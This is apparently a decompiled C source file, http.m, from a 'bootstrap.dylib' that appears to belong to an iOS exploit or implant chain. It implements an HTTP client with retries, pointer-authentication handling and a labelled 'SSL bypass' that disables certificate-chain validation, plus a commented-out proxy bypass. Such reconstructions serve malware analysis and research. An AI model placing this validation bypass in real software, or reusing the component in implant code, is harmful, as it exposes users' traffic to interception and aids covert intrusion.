/*
 * http.m - CFNetwork-based HTTP client with SSL bypass
 *
 * Decompiled from bootstrap.dylib offsets 0x8b5c-0x92fc, 0x9790-0x9878
 */

#import "bootstrap.h"
#import <string.h>
#import <stdlib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <CFNetwork/CFNetwork.h>
#import <SystemConfiguration/SystemConfiguration.h>

/* ── stream_read_callback (0x9790) ──────────────────────────────── */

void stream_read_callback(void *stream, int event, void *info)
{
    if (!stream || !info)
        goto stop;

    stream_ctx_t *ctx = (stream_ctx_t *)info;

    if (event > 3) {
        if (event == 4) {
            goto stop;
        }
        if (event == 8) {
            ctx->error = ERR_HTTP_STREAM_ERR;
            print_log("[bootstrap] stream_read_callback: stream error");
            goto stop;
        }
        if (event == 16) {
            CFTypeRef resp = CFReadStreamCopyProperty(
                (CFReadStreamRef)stream, kCFStreamPropertyHTTPResponseHeader);
            if (resp) {
                ctx->status_code = CFHTTPMessageGetResponseStatusCode(
                    (CFHTTPMessageRef)resp);
                CFRelease(resp);
            }
            print_log("[bootstrap] stream_read_callback: got header status=%u", ctx->status_code);
            goto stop;
        }
        goto stop;
    }

    if (event < 2)
        goto stop;

    if (event == 2) {
        uint8_t buf[0x1000];
        CFIndex n = CFReadStreamRead((CFReadStreamRef)stream, buf, 0x1000);
        if (n <= 0)
            goto stop;

        if (!CFHTTPMessageAppendBytes((CFHTTPMessageRef)ctx->response_msg, buf, n))
            goto stop;
    }

    return;

stop:
    {
        extern void CFRunLoopStop(CFRunLoopRef);
        CFRunLoopStop(CFRunLoopGetCurrent());
    }
}

/* ── http_request (0x8b5c) ──────────────────────────────────────── */

uint32_t http_request(const char *url, const char *user_agent,
                      const char *content_type, const char *body,
                      void **out_data, uint32_t *out_size)
{
    uint32_t err = ERR_NULL_CTX - 8;
    CFDataRef response_data = NULL;

    int has_output = (out_data != NULL) && (out_size != NULL);
    int no_output = (out_data == NULL && out_size == NULL);
    if (!has_output && !no_output)
        return err;

    if (!url || !url[0])
        return err;

    print_log("[bootstrap] http_request: url=%s method=%s", url, body ? "POST" : "GET");

    CFAllocatorRef alloc = kCFAllocatorDefault;

    CFStringRef url_str = CFStringCreateWithCString(alloc, url, kCFStringEncodingUTF8);
    if (!url_str)
        return ERR_HTTP_URL;
    if (CFStringGetLength(url_str) < 1) {
        CFRelease(url_str);
        return ERR_HTTP_URL_LEN;
    }

    CFStringRef ua_str = NULL;
    if (user_agent) {
        ua_str = CFStringCreateWithCString(alloc, user_agent, kCFStringEncodingUTF8);
        if (!ua_str) {
            CFRelease(url_str);
            return ERR_HTTP_BODY_ERR;
        }
        if (CFStringGetLength(ua_str) <= 0) {
            CFRelease(url_str);
            CFRelease(ua_str);
            return ERR_HTTP_CT_ERR;
        }
    }

    CFStringRef ct_str = NULL;
    CFDataRef body_data = NULL;

    if (content_type) {
        ct_str = CFStringCreateWithCString(alloc, content_type, kCFStringEncodingUTF8);
        if (!ct_str) {
            err = ERR_HTTP_BODY_ERR;
            goto cleanup_early;
        }
        if (CFStringGetLength(ct_str) < 1) {
            err = ERR_HTTP_CT_ERR;
            goto cleanup_early;
        }
    }

    if (body) {
        size_t blen = strlen(body);
        body_data = CFDataCreate(alloc, (const UInt8 *)body, blen);
        if (!body_data) {
            err = ERR_HTTP_DATA_ERR;
            goto cleanup_early;
        }
    }

    /* Retry loop (up to 7 attempts) */
    uint32_t attempt;
    for (attempt = 0; attempt < 7; attempt++) {
        if (has_output)
            *out_data = NULL;

        CFURLRef cf_url = CFURLCreateWithString(alloc, url_str, NULL);
        if (!cf_url) {
            if (attempt < 6) continue;
            err = ERR_HTTP_URL;
            break;
        }

        CFStringRef scheme = CFURLCopyScheme(cf_url);
        if (!scheme) {
            CFRelease(cf_url);
            err = ERR_HTTP_SCHEME;
            goto release_round;
        }

        const char *method = body_data ? "POST" : "GET";
        CFStringRef method_str = CFStringCreateWithCString(alloc, method, kCFStringEncodingUTF8);
        if (!method_str) {
            err = ERR_HTTP_MSG;
            CFRelease(cf_url);
            CFRelease(scheme);
            goto release_round;
        }

        CFHTTPMessageRef req = CFHTTPMessageCreateRequest(
            alloc, method_str, cf_url, kCFHTTPVersion1_1);
        if (!req) {
            err = ERR_HTTP_MSG;
            CFRelease(cf_url);
            CFRelease(scheme);
            CFRelease(method_str);
            goto release_round;
        }

        if (body_data)
            CFHTTPMessageSetBody(req, body_data);

        CFStringRef ua_hdr_key = NULL;
        if (ua_str) {
            ua_hdr_key = CFStringCreateWithCString(alloc, "User-Agent", kCFStringEncodingUTF8);
            if (ua_hdr_key)
                CFHTTPMessageSetHeaderFieldValue(req, ua_hdr_key, ua_str);
        }

        CFStringRef ct_hdr_key = NULL;
        if (ct_str) {
            ct_hdr_key = CFStringCreateWithCString(alloc, "Content-Type", kCFStringEncodingUTF8);
            if (ct_hdr_key)
                CFHTTPMessageSetHeaderFieldValue(req, ct_hdr_key, ct_str);
        }

        CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(alloc, req);
        if (!stream) {
            err = ERR_HTTP_STREAM;
            goto release_all;
        }

        /* SSL bypass: disable certificate validation for HTTPS */
        CFStringRef https_str = CFSTR("https");
        int ssl_ok = 1;
        if (CFEqual(scheme, https_str)) {
            CFDictionaryRef ssl_dict = CFDictionaryCreate(
                alloc,
                (const void *[]){kCFStreamSSLValidatesCertificateChain},
                (const void *[]){kCFBooleanFalse},
                1, NULL, NULL);
            if (ssl_dict) {
                ssl_ok = CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, ssl_dict);
                CFRelease(ssl_dict);
            } else {
                err = ERR_HTTP_DICT;
                goto release_stream;
            }
        }

        if (!ssl_ok) {
            err = ERR_HTTP_SSL;
            goto release_stream;
        }

        // SCDynamicStoreCopyProxies is not available on iOS, and we would bypass this anyways
//        CFDictionaryRef proxies = SCDynamicStoreCopyProxies(NULL);
//        if (proxies) {
//            int proxy_ok = CFReadStreamSetProperty(stream, kCFStreamPropertyHTTPProxy, proxies);
//            CFRelease(proxies);
//            if (!proxy_ok) {
//                err = ERR_HTTP_PROXY;
//                goto release_stream;
//            }
//        } else {
//            err = ERR_HTTP_PROXY;
//            goto release_stream;
//        }

        CFHTTPMessageRef resp_msg = CFHTTPMessageCreateEmpty(alloc, false);
        if (!resp_msg) {
            err = ERR_HTTP_MSG;
            goto release_stream;
        }

        stream_ctx_t *sctx = (stream_ctx_t *)calloc(sizeof(stream_ctx_t), 1);
        if (!sctx) {
            CFRelease(resp_msg);
            err = ERR_GENERIC;
            goto release_stream;
        }

        sctx->response_msg = (void *)resp_msg;
        sctx->status_code = 500;

        void *callback_fn = (void *)pac_sign_if_needed(
            strip_pac((uint64_t)stream_read_callback), 0);

        struct {
            long version;
            void *info;
            void *retain;
            void *release;
            void *desc;
        } client_ctx;
        memset(&client_ctx, 0, sizeof(client_ctx));
        client_ctx.info = sctx;

        if (!CFReadStreamSetClient(stream, 0x1a, callback_fn, (CFStreamClientContext *)&client_ctx)) {
            free(sctx);
            CFRelease(resp_msg);
            err = ERR_HTTP_CLIENT;
            goto release_stream;
        }

        CFReadStreamScheduleWithRunLoop(stream, CFRunLoopGetCurrent(), kCFRunLoopCommonModes);

        if (!CFReadStreamOpen(stream)) {
            free(sctx);
            CFRelease(resp_msg);
            err = ERR_HTTP_OPEN;
            goto release_stream;
        }

        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 240.0, false);
        CFReadStreamClose(stream);

        err = sctx->error;
        if (!err) {
            uint32_t status = sctx->status_code;
            print_log("[bootstrap] http_request: attempt=%u status=%u", attempt, status);
            if (status > 399 || !has_output) {
                if (status > 399)
                    err = ERR_HTTP_STATUS;
                response_data = NULL;
            } else {
                CFDataRef body_resp = CFHTTPMessageCopyBody((CFHTTPMessageRef)sctx->response_msg);
                if (!body_resp) {
                    err = ERR_HTTP_EMPTY_BODY;
                } else {
                    response_data = body_resp;
                    *out_data = (void *)body_resp;
                }
            }
        } else {
            print_log("[bootstrap] http_request: attempt=%u stream_err=0x%x", attempt, err);
            response_data = NULL;
        }

        free(sctx);
        CFRelease(resp_msg);

    release_stream:
        CFRelease(stream);
    release_all:
        CFRelease(req);
        CFRelease(cf_url);
        CFRelease(scheme);
        CFRelease(method_str);
        if (ua_hdr_key) CFRelease(ua_hdr_key);
    release_round:
        if (ct_hdr_key) CFRelease(ct_hdr_key);

        if (!err || attempt >= 6)
            break;
    }

    /* Process final response data */
    if (!err && response_data && has_output) {
        CFIndex len = CFDataGetLength(response_data);
        if (!len) {
            err = ERR_HTTP_ZERO_LEN;
        } else {
            const uint8_t *bytes = CFDataGetBytePtr(response_data);
            if (!bytes) {
                err = ERR_HTTP_NO_RESP;
            } else {
                void *copy = malloc((size_t)len);
                if (!copy) {
                    err = ERR_GENERIC;
                } else {
                    memcpy(copy, bytes, (size_t)len);
                    *out_data = copy;
                    *out_size = (uint32_t)len;
                    print_log("[bootstrap] http_request: OK response_size=%ld", (long)len);
                }
            }
        }
    }

cleanup_early:
    if (url_str) CFRelease(url_str);
    if (ua_str) CFRelease(ua_str);
    if (ct_str) CFRelease(ct_str);
    if (body_data) CFRelease(body_data);
    if (response_data) CFRelease(response_data);

    if (err)
        print_log("[bootstrap] http_request: FAIL err=0x%x", err);
    return err;
}
